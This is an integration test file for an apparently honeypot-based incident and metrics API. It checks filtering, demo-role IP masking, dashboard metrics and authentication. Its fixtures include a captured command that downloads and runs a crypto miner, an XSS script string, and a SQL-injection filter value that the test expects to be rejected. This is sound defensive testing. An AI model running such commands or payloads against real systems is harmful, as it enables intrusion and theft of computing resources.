// Integration tests against a real Postgres. Skipped unless TEST_DATABASE_URL is set.
// WARNING: drops and recreates the `public` schema of that database.
import { afterAll, beforeAll, describe, expect, it } from "vitest";

const url = process.env.TEST_DATABASE_URL;
const A = "91.92.93.94";
const B = "91.92.94.7";

describe.skipIf(!url)("incident + metrics API (postgres)", () => {
  /** @type {import("pg").Pool} */
  let pool;
  /** @type {import("supertest").Agent} */
  let request;
  /** @type {Record<string, string>} */
  const auth = {};
  /** @type {string} */
  let criticalId;

  beforeAll(async () => {
    process.env.DATABASE_URL = url;
    ({ pool } = await import("../../src/db/pool.js"));
    const { runMigrations } = await import("../../src/db/migrations.js");
    await pool.query("DROP SCHEMA public CASCADE; CREATE SCHEMA public;");
    await runMigrations(pool, { log: () => {} });
    const { createUserIfMissing } = await import("../../src/services/userService.js");
    await createUserIfMissing(pool, { username: "alice", password: "admin-password-123", role: "admin" });
    await createUserIfMissing(pool, { username: "viewer", password: "demo-password-123", role: "demo" });

    const { insertEvents } = await import("../../src/services/eventService.js");
    const { correlateNewEvents } = await import("../../src/correlation/correlator.js");
    const base = { sensor_id: "t", src_port: 4444, session_id: "s", auth_method: "password", http_method: null, http_path: null,
      user_agent: null, http_headers: {}, raw: null, truncated: false, protocol: "ssh", password: null, auth_success: null, command: null };
    await pool.query(
      `INSERT INTO ip_enrichment_cache (ip, provider, data, expires_at)
       VALUES ($1, 'virustotal', '{"found":true,"network":"91.92.93.0/24","malicious":4}', NOW() + interval '1 day'),
              ($1, 'abuseipdb', '{"found":true,"domain":"attacker-isp.example","abuse_confidence":90}', NOW() + interval '1 day')`,
      [A]
    );
    await insertEvents(/** @type {any[]} */ ([
      { ...base, ts: new Date(), src_ip: A, event_type: "auth_attempt", username: "root", password: "123456", auth_success: true },
      { ...base, ts: new Date(), src_ip: A, event_type: "command", username: "root", command: "wget http://x/m; ./xmrig" },
      { ...base, ts: new Date(), src_ip: A, event_type: "command", username: "root", command: "<script>alert(1)</script>" },
      { ...base, ts: new Date(), src_ip: B, event_type: "auth_attempt", username: "admin", password: "admin", auth_success: false }
    ]));
    const touched = await correlateNewEvents(pool, { windowMinutes: 30 });
    criticalId = /** @type {any} */ (touched.find((t) => t.src_ip === A)).id;
    // A report whose free text mentions the IP (rule reports do: "N events from <ip>").
    await pool.query(
      `INSERT INTO agent_reports (incident_id, source, ai_generated, report, validation_status)
       VALUES ($1, 'rules', false, $2, 'fallback')`,
      [criticalId, JSON.stringify({ summary: `3 events from ${A}.`, attacker_profile: `Host ${A}`, techniques: [], severity: "critical", recommended_actions: [] })]
    );

    const { default: supertest } = await import("supertest");
    const { app } = await import("../../src/app.js");
    request = supertest(app);
    for (const [k, u, p] of [["admin", "alice", "admin-password-123"], ["demo", "viewer", "demo-password-123"]]) {
      auth[k] = `Bearer ${(await request.post("/auth/login").send({ username: u, password: p })).body.token}`;
    }
  });

  afterAll(async () => {
    await pool?.end();
  });

  it("lists incidents with severity / technique / tag filters", async () => {
    const all = await request.get("/incidents").set("authorization", auth.admin).expect(200);
    expect(all.body.total).toBe(2);

    const crit = await request.get("/incidents?severity=critical").set("authorization", auth.admin).expect(200);
    expect(crit.body.items.map((/** @type {any} */ i) => i.src_ip)).toEqual([A]);

    const t = await request.get("/incidents?technique=T1496").set("authorization", auth.admin).expect(200);
    expect(t.body.items).toHaveLength(1);
    const tag = await request.get("/incidents?tag=cryptomining").set("authorization", auth.admin).expect(200);
    expect(tag.body.items).toHaveLength(1);
    const none = await request.get("/incidents?tag=persistence").set("authorization", auth.admin).expect(200);
    expect(none.body.items).toHaveLength(0);
  });

  it("rejects malformed filters instead of passing them to SQL", async () => {
    await request.get("/incidents?technique=T1110' OR 1=1--").set("authorization", auth.admin).expect(400);
    await request.get("/incidents?tag=a%20b").set("authorization", auth.admin).expect(400);
    await request.get("/incidents?from=yesterday").set("authorization", auth.admin).expect(400);
    await request.get("/incidents/abc").set("authorization", auth.admin).expect(400);
  });

  it("returns incident detail with timeline, ATT&CK links and intel", async () => {
    const d = await request.get(`/incidents/${criticalId}`).set("authorization", auth.admin).expect(200);
    expect(d.body.severity).toBe("critical");
    expect(d.body.events).toHaveLength(3);
    expect(d.body.events[2].command).toBe("<script>alert(1)</script>"); // raw text; rendering is the UI's job
    expect(d.body.techniques.find((/** @type {any} */ t) => t.id === "T1059.004").url).toBe("https://attack.mitre.org/techniques/T1059/004/");
    expect(d.body.intel.providers.map((/** @type {any} */ p) => p.provider)).toEqual(["abuseipdb", "virustotal"]);
  });

  it("masks IPs and host-identifying intel for the demo role, server-side", async () => {
    const d = await request.get(`/incidents/${criticalId}`).set("authorization", auth.demo).expect(200);
    const body = JSON.stringify(d.body);
    expect(body).not.toContain(A);
    expect(body).not.toContain("91.92.93.0/24");
    expect(body).not.toContain("attacker-isp.example");
    expect(d.body.src_ip).toBe("91.92.93.x");
    expect(d.body.events[0].src_ip).toBe("91.92.93.x");

    const list = await request.get("/incidents").set("authorization", auth.demo).expect(200);
    expect(JSON.stringify(list.body)).not.toContain(A);
    const m = await request.get("/metrics/dashboard").set("authorization", auth.demo).expect(200);
    expect(JSON.stringify(m.body)).not.toMatch(/91\.92\.9[34]\.\d/);
    // Legacy endpoints used by the Overview page, too.
    for (const path of ["/stats", "/attacks", "/top-ip"]) {
      const r = await request.get(path).set("authorization", auth.demo).expect(200);
      expect(JSON.stringify(r.body), path).not.toMatch(/91\.92\.9[34]\.\d/);
    }
    const adminStats = await request.get("/stats").set("authorization", auth.admin).expect(200);
    expect(JSON.stringify(adminStats.body)).toContain(A);
  });

  it("serves dashboard metrics", async () => {
    const m = await request.get("/metrics/dashboard?days=7").set("authorization", auth.admin).expect(200);
    expect(m.body.events_per_hour).toHaveLength(48);
    expect(m.body.events_per_hour.reduce((/** @type {number} */ s, /** @type {any} */ b) => s + b.count, 0)).toBe(4);
    expect(m.body.totals).toMatchObject({ events: 4, incidents: 2, pending_actions: 0 });
    expect(m.body.top_source_ips[0]).toEqual({ ip: A, count: 3 });
    expect(m.body.top_techniques.map((/** @type {any} */ t) => t.id)).toContain("T1496");
    expect(m.body.llm_budget_today).toMatchObject({ configured: false, calls: 0 });
    await request.get("/metrics/dashboard?days=0").set("authorization", auth.admin).expect(400);
  });

  it("requires login", async () => {
    await request.get("/incidents").expect(401);
    await request.get("/metrics/dashboard").expect(401);
  });
});
